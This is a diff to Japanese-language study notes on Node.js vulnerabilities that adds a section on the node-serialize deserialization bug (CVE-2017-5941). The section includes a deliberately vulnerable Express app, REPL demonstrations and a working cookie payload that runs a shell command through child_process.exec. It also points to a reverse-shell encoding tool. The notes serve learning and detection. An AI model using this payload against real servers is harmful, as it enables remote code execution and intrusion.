@@ -21,7 +21,9 @@
 # 脆弱性発見方法
 エラー文が出て入れば、その該当箇所のソースコードをgithubで探して、wikiとかTutorialとかissueを見る。   
 Injection系はevalを探す。   
-見つかれば、ユーザーの入力をエスケープするような部分を`html`,`escape`とかのキーワードで検索して見つける。
+見つかれば、ユーザーの入力をエスケープするような部分を`html`,`escape`とかのキーワードで検索して見つける。   
+## キーワード
+`eval`,`eval(`,`html`,`escape`,`new Buffer(`,`unserialize`,`node-serialize`   
 # Vuln
 ## sample
 - 概要   
@@ -29,6 +31,89 @@ Injection系はevalを探す。
 - 発見方法   
 - 対策   
 - 参考資料   
+## Deserialization
+### nodejs-serialize (CVE-2017-5941)
+- 概要   
+Node.jsのnode-serializeパッケージ0.0.4のunserialize（）関数に渡された信頼できないデータを悪用して、即時呼び出し関数式（IIFE）を使用してJavaScriptオブジェクトを渡すことにより、任意のコードを実行できる。   
+https://www.cvedetails.com/cve/CVE-2017-5941/   
+cvedetails   
+https://github.com/luin/serialize/issues/4   
+node-serializeのissue。   
+- 例   
+```js
+var express = require('express');
+var cookieParser = require('cookie-parser');
+var escape = require('escape-html');
+var serialize = require('node-serialize');
+var app = express();
+app.use(cookieParser())
+
+app.get('/', function(req, res) {
+  if (req.cookies.profile) {
+    // Cookieのprofileの値をbase64デコード
+    var str = new Buffer(req.cookies.profile,
+    'base64').toString();
+    // ここが脆弱！
+    // Cookieの値をbase64デコードしたものを逆シリアライズする
+    var obj = serialize.unserialize(str);
+    // Cookieの中の値を逆シリアライズによってオブジェクトにして、値を取り出す
+    if (obj.username) {
+    res.send("Hello " + escape(obj.username));
+      }
+    } else {
+      res.cookie('profile',
+      "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5Ijo
+      iYmFuZ2Fsb3JlIn0=", { maxAge: 900000, httpOnly: true});
+    }
+  res.send("Hello World");
+});
+
+app.listen(3000);
+```
+`serialize.unserialize(str)`が脆弱。   
+この逆シリアライズする中に、IIFE形式の関数があれば逆シリアライズしたときに呼び出されなくても自動的に実行する。   
+```txt
+> var x = {'a': function(){console.log('a')}}  // 普通。宣言しただけでは実行されない
+undefined
+> x.a
+[Function: a]
+> x.a();  // メソッドを指定して初めて実行される
+a
+undefined
+> var x = {'a': function(){console.log('a')}()}  // IIFE形式。最後に()を足す
+a         // 宣言したときにすぐに実行される！
+undefined
+> 
+```
+よって、以下のようなシリアライズされた文字列に`()`を付け足してIIFE形式にすることで、逆シリアライズ時に即時実行される。   
+ここでは、`{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()"}`をbase64エンコードしたものをCookieにセットするとRCEできる！   
+```txt
+> var serialize = require('node-serialize');
+> var poc = {x: function(){console.log("POC")} }
+undefined
+> serialize.serialize(poc)
+'{"x":"_$$ND_FUNC$$_function(){console.log(\\"POC\\")}"}'
+> var y = { rce : function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}, }
+undefined
+> serialize.serialize(y)
+`{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}"}`
+```
+
+- 発見方法   
+`unserialize`,`require('node-serialize')`キーワードが含まれているかどうか。   
+`node_modules`ディレクトリの中にversion 0.0.4(おそらく最新版でも)の`node-serialize`ディレクトリがあるかどうか。   
+- 対策   
+`node-serialize`モジュールは最新版でもおそらく修正されてない。   
+https://www.npmjs.com/package/node-serialize   
+- 参考資料   
+https://blacksheephacks.pl/nodejs-deserialization/   
+説明。   
+https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf   
+説明。   
+https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py   
+`eval(String.fromCharCode(10,118,...,10))`の形式で書けばクウォートとかを使わずにReverse shellのコードが書ける。   
+https://v3ded.github.io/ctf/htb-celestial   
+HTBのWriteup。   
 ## Command Injection
 ### dustjs-helper (Node.js)
 - 概要   
